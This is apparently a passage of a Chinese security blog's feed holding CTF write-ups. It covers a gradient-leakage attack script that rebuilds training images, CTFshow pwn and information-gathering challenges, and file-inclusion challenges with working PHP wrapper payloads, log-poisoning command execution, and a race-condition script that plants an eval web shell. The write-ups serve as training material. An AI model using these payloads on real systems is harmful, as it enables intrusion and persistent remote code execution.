class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>详解见<a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p>但是这份代码目前也存在一定问题，还有参数需要调整，恢复效果不佳。</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>梯度泄露攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-Test_your_nc</title>
    <url>/2024/03/08/CTFshow-Test_your_nc/</url>
    <content><![CDATA[<h1>CTFshow-Test_your_nc</h1>
<h2 id="pwn0">pwn0</h2>
<p>ssh连接，输入密码123456</p>
<p>查找一下得到flag</p>
<p><img src="https://s2.loli.net/2024/03/08/FxsuYgliSHcoT4q.png" alt="ctfshow_testnc_1"></p>
<h2 id="pwn1">pwn1</h2>
<p><img src="https://s2.loli.net/2024/03/08/WMzjcUSNCZdEvPe.png" alt="ctfshow_testnc_2"></p>
<p>ida64位反编译后，可以发现system函数可以直接利用</p>
<p><img src="https://s2.loli.net/2024/03/08/t2X4nvOTwf1EdPV.png" alt="ctfshow_testnc_3"></p>
<h2 id="pwn2">pwn2</h2>
<p><img src="https://s2.loli.net/2024/03/08/A3nYUJ9dlkfvaDh.png" alt="ctfshow_testnc_4"></p>
<p>输入cat命令即可得到flag</p>
<p><img src="https://s2.loli.net/2024/03/08/AFjwL64dIzleqkQ.png" alt="ctfshow_testnc_5"></p>
<h2 id="pwn3">pwn3</h2>
<p><img src="https://s2.loli.net/2024/03/08/DmOhgtk92WQXnqH.png" alt="ctfshow_testnc_6"></p>
<p>在system_func中发现存在system命令，可以获取flag</p>
<p><img src="https://s2.loli.net/2024/03/08/FWBVQaUvY5PAd7b.png" alt="ctfshow_testnc_7"></p>
<h2 id="pwn4">pwn4</h2>
<p><img src="https://s2.loli.net/2024/03/08/ALru1Z9Cf3zHth2.png" alt="ctfshow_testnc_8"></p>
<p>在这里可以发现存在一个字符串比较的逻辑，输入CTFshowPWN作为字符串进行比较，然后可以进行execve_func函数</p>
<p><img src="https://s2.loli.net/2024/03/08/U5rgY49PpQf7uoA.png" alt="ctfshow_testnc_9"></p>
<p>进入后发现已经存在可交互的shell</p>
<p><img src="https://s2.loli.net/2024/03/08/23upfgvCyUK6xQ7.png" alt="ctfshow_testnc_10"></p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>Test_your_nc</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-信息搜集</title>
    <url>/2023/12/19/CTFshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1>CTFshow-信息搜集</h1>
<h2 id="web1">web1</h2>
<p>f12，前端js敏感泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/3wpAmDHNfxPEKC5.png" alt="ctfshow_xinxisouji_1"></p>
<h2 id="web2">web2</h2>
<p>禁止了f12，但仍然可以通过查看源码发方式去发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/gK3hSrmNvXBjlUt.png" alt="ctfshow_xinxisouji_2"></p>
<h2 id="web3">web3</h2>
<p>flag藏在响应包中</p>
<p><img src="https://s2.loli.net/2023/12/19/OWwmaN8i9KSdCPs.png" alt="ctfshow_xinxisouji_3"></p>
<h2 id="web4">web4</h2>
<p>查看robots.txt泄露信息，访问相应目录得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/pQaHgDOAEG3YsBf.png" alt="ctfshow_xinxisouji_4"></p>
<h2 id="web5">web5</h2>
<p>存在源码泄露，访问index.phps，下载得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/QtJiznrYFUC79BE.png" alt="ctfshow_xinxisouji_5"></p>
<h2 id="web6">web6</h2>
<p>同信息泄露，访问www.zip，得到源码的压缩包</p>
<p><img src="https://s2.loli.net/2023/12/19/uxXkLBZlwHhgdMs.png" alt="ctfshow_xinxisouji_6"></p>
<h2 id="web7">web7</h2>
<p>版本控制，明显提示了git泄露</p>
<p>访问.git</p>
<p><img src="https://s2.loli.net/2023/12/19/f9VyPXODWpjYmFQ.png" alt="ctfshow_xinxisouji_7"></p>
<h2 id="web8">web8</h2>
<p>版本控制，跟上一题有所区别，是svn泄露</p>
<p>访问.svn</p>
<p><img src="https://s2.loli.net/2023/12/19/RmQ5zOPCyESpoUw.png" alt="ctfshow_xinxisouji_8"></p>
<h2 id="web9">web9</h2>
<p>提示vim，存在缓存泄露</p>
<p>访问index.php.swp</p>
<p><img src="https://s2.loli.net/2023/12/19/JUEIWPLwMlaTY6A.png" alt="ctfshow_xinxisouji_9"></p>
<h2 id="web10">web10</h2>
<p>直接查看cookie即得到</p>
<p><img src="https://s2.loli.net/2023/12/19/S5qH9XU2pR7AhK1.png" alt="ctfshow_xinxisouji_10"></p>
<h2 id="web11">web11</h2>
<p>考察的是DNS解析相关，刚好填补了知识点的空缺</p>
<p><img src="https://s2.loli.net/2023/12/19/bYNALzscdjB36IC.png" alt="ctfshow_xinxisouji_11"></p>
<h2 id="web12">web12</h2>
<p>主页面地下一串数字，即是密码</p>
<p>访问robots.txt，得到管理员后台路径/admin</p>
<p>然后账号admin，密码372619038</p>
<p>既得flag</p>
<h2 id="web13">web13</h2>
<p>页面下方documents点击</p>
<p><img src="https://s2.loli.net/2023/12/19/mBFd3P1wbSTnE7i.png" alt="ctfshow_xinxisouji_12"></p>
<p>然后发现开发者文档</p>
<p><img src="https://s2.loli.net/2023/12/19/lBcnrqbRNGmzPTC.png" alt="ctfshow_xinxisouji_13"></p>
<p>登录即得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/GbsVhao8P9mkrA5.png" alt="ctfshow_xinxisouji_14"></p>
<h2 id="web14">web14</h2>
<p>存在编辑器</p>
<p><img src="https://s2.loli.net/2023/12/19/DdokiKVFqbNJYsH.png" alt="ctfshow_xinxisouji_15"></p>
<p>文件上传处存在源码泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/o71TQKGNUfObIgZ.png" alt="ctfshow_xinxisouji_16"></p>
<p>然后找到相应的flag文件</p>
<p>访问对应路径/nothinghere/fl000g.txt 得到flag</p>
<h2 id="web15">web15</h2>
<p>扫描发现存在后台/admin</p>
<p>然后根据邮箱进行社工，发现密保答案，重置密码</p>
<p>登录得到flag</p>
<h2 id="web16">web16</h2>
<p>探针默认名称为</p>
<p>tz.php，访问后在phpinfo中找到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/Cg3GD1Awu2ab97M.png" alt="ctfshow_xinxisouji_17"></p>
<p><img src="https://s2.loli.net/2023/12/19/HmRYp3f4cjheEk2.png" alt="ctfshow_xinxisouji_18"></p>
<h2 id="web17">web17</h2>
<p>扫描后发现存在backup.sql泄露</p>
<p>然后在文件中发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/itj8EzL5TxlUFCJ.png" alt="ctfshow_xinxisouji_19"></p>
<h2 id="web18">web18</h2>
<p>源码中存在敏感信息</p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p>解密后访问110.php</p>
<h2 id="web19">web19</h2>
<p>前端加密，参数保存在js中</p>
<p><img src="https://s2.loli.net/2023/12/19/sNkwgWSCDFxVcey.png" alt="ctfshow_xinxisouji_22"></p>
<p>根据源码，aes加密，CBC模式，zeropadding填充</p>
<p>然后解密可得密码</p>
<p><img src="https://s2.loli.net/2023/12/19/bKWAzSZkBwdQsRe.png" alt="ctfshow_xinxisouji_23"></p>
<p>最后进行登录，获得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/j6gUmZuhnMx5ri1.png" alt="ctfshow_xinxisouji_24"></p>
<h2 id="web20">web20</h2>
<p>访问/db/db.mdb</p>
<p>下载库，查找flag</p>
<p><img src="https://s2.loli.net/2023/12/19/9nHjpeWtQJxYvba.png" alt="ctfshow_xinxisouji_25"></p>
<h2 id="总结">总结</h2>
<p>信息泄露问题很普遍，前期的信息搜集很重要，无论是在CTF赛事中，还是在实战。</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-文件包含</title>
    <url>/2024/01/19/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1>CTFshow-文件包含</h1>
<h2 id="web78">web78</h2>
<h3 id="源码">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>文件包含，伪协议的利用，可以使用的方法有很多</p>
<h4 id="方法一">方法一</h4>
<p>php协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>data协议+命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; </span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web79">web79</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<p>过滤了php，可以考虑的办法就是对php绕过或者是改用其他协议</p>
<p>这边选择直接使用data协议+命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&quot;tac%20flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p>注意跟上题不同的一点，因为过滤了php，所以在php代码执行环境的方法需要变一下</p>
<h2 id="web80">web80</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>这里将data协议也过滤了</p>
<p>这里学到一个新方法，利用文件日志包含进行getshell的操作</p>
<p>首先在User-Agent中写入我们需要执行的命令，然后相关请求就会存放于日志文件中，然后对该日志文件进行文件包含操作，就可以成功getshell了，当然直接写入一句话木马也是可以的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<h2 id="web81">web81</h2>
<h3 id="源码-4">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-4">payload</h3>
<p>本题仅禁用了:，对于上一题的日志写入没有过滤，仍然可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<h2 id="web82">web82</h2>
<h2 id="web83">web83</h2>
<h2 id="web84">web84</h2>
<h2 id="web85">web85</h2>
<h2 id="web86">web86</h2>
<p>以上这些全部归属于条件竞争</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 填入对应网址</span></span><br><span class="line">url=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">	        data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		<span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
<p>这是一个现有的exp，具体原理需要研究一下</p>
<h2 id="web87">web87</h2>
<h3 id="源码-5">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-5">payload</h3>
<p>这边先来看一下<code>file_put_contents</code> 是一个 PHP 函数，用于将一个字符串写入文件。它提供了一种简单的方法，可以直接将字符串内容写入文件中，而无需使用多个函数来打开、写入和关闭文件。</p>
<p>基本的语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(filename, data, mode, context);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><code>filename</code> 是要写入的目标文件的文件名，可以包含路径信息。</li>
<li><code>data</code> 是要写入文件的字符串数据。</li>
<li><code>mode</code> 是一个可选参数，表示文件写入的模式。默认是 <code>0</code>，表示没有特殊处理。你可以使用 <code>FILE_APPEND</code> 来在文件末尾追加内容，如果文件不存在，则会创建新文件。</li>
<li><code>context</code> 是一个可选参数，表示上下文资源，通常在需要自定义流上下文的情况下使用。</li>
</ul>
<p><strong>get参数</strong></p>
<p>get请求的参数file会经过urldecode参数的处理，所以在传入的时候需要经过二次编码</p>
<p><strong>原始</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
<p><strong>二次编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filespan><br></pre></td></tr></table></figure>
<p><strong>post参数</strong></p>
<p>p神的文章里详细的写了有关死亡exit的绕过方式</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></p>
<p>这边使用的是直接命令执行，当然也可以选择使用一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
<p>最终传入的需要添加两个字符在最前面，因为base64的解码规则是4byte一组，而phpdie仅有六个字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
<h2 id="web88">web88</h2>
<h3 id="源码-6">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-6">payload</h3>
<p>利用data协议的base编码来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4g</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Round-17 Basic-Writeup-Web</title>
    <url>/2024/02/21/NSSCTF%20Round-17%20Basic-Writeup-Web/</url>
    <content><![CDATA[<h1>NSSCTF Round-17 Basic-Writeup-Web</h1>
<h2 id="前言">前言</h2>
<p>一次很难评的周赛，web里藏misc，准确来说藏musc，何必呢？</p>
<h2 id="web">web</h2>
<h3 id="真·签到">真·签到</h3>
<p>查看robots.txt页面可以发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure>
<p>解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#base16</span><br><span class="line">hint:用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br><span class="line">#敲击码</span><br><span class="line">username:C(K)TFER-&gt;ctfer</span><br><span class="line">#base32 base64 md5</span><br><span class="line">password:c9fa95881ea0152791d4a759dacd79de(Nss)</span><br></pre></td></tr></table></figure>
<p>登录后查看前端</p>
<p><img src="https://s2.loli.net/2024/02/21/lfz4DquXpoyHBvP.png" alt="NSSCTF Round"></p>
<p>然后是一个弱类型问题</p>
